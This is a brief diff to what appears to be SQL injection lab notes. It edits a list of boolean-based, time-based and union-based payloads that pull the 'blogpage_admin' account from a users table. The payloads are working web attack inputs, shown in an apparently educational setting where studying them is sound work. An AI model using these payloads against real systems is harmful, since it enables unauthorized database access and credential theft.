@@ -16,6 +16,6 @@
 
 1. Boolean-based: `' OR (SELECT SUBSTRING(username, 1, 1) FROM users WHERE username = 'blogpage_admin') = 'a' %23`
 
-2. Time-based: `' OR IF(SUBSTRING((SELECT username FROM users WHERE username = 'blogpage_admin'), 1, 1) = 'b', SLEEP(1), 0) LIMIT 1 %23`
+2. Time-based: `' OR IF(SUBSTRING((SELECT username FROM users WHERE username = 'blogpage_admin'), 1, 1) = 'b', SLEEP(1), 0) %23`
 
 3. Error-based: `' union select null, null, null, null, null %23`
